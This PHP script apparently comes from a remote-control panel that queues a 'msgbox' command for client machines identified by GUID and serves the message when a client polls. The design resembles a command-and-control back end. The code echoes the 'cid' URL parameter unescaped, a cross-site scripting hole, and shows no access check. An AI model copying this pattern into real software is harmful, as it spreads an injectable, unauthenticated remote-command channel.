<?php 
include("../includes/connect.php");

if (isset($_GET['request'])) {
  $guid = mysqli_real_escape_string($connect, $_GET['guid']);
  $sql = "SELECT * FROM messages WHERE guid = '$guid'";
  $query = mysqli_query($connect, $sql);
  if (mysqli_num_rows($query) != 0) {
    while($rows = mysqli_fetch_array($query)) {
      echo $rows['msgboxTitle'] . "|" . $rows['msgboxBody'];
    }
    $sql = "DELETE FROM messages WHERE guid = '$guid'";
    $query = mysqli_query($connect, $sql);
  }
}else{
  if (isset($_POST['submit'])) {
    $guid = mysqli_real_escape_string($connect, $_POST['guid']);
    $msgboxTitle = mysqli_real_escape_string($connect, $_POST['msgboxTitle']);
    $msgboxBody = mysqli_real_escape_string($connect, $_POST['msgboxBody']);

    $sql = "INSERT INTO messages (guid, msgboxTitle, msgboxBody) VALUES ('$guid', '$msgboxTitle', '$msgboxBody')";
    $query = mysqli_query($connect, $sql);
    $sql = "UPDATE clients SET command = 'msgbox' WHERE guid = '$guid'";
    $query = mysqli_query($connect, $sql);
    echo "Message sent...";
  }
    ?>
    <html>
    <head>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha256-3edrmyuQ0w65f8gfBsqowzjJe2iM6n0nKciPUp8y+7E=" crossorigin="anonymous"></script>
        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
        <!-- Latest compiled and minified JavaScript -->
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    </head>
    <body>
    
    <form action="msg.php" method="POST">
      <div class="form-group">
        <label for="msgboxTitle">MessageBox Title</label>
        <input name="msgboxTitle" type="text" class="form-control" placeholder="Enter Messagebox Title">
      </div>
      <div class="form-group">
        <label for="msgboxBody">MessageBox Body</label>
        <input name="msgboxBody" type="text" class="form-control" placeholder="Enter Messagebox Body">
      </div>
      <p>
      <input name="guid" type="hidden" value="<?php echo $_GET['cid'];?>"/>
      <button type="submit" name="submit" class="btn btn-primary">Send!</button>
    </form>
    </body>
    </html>
    <?php
}
?>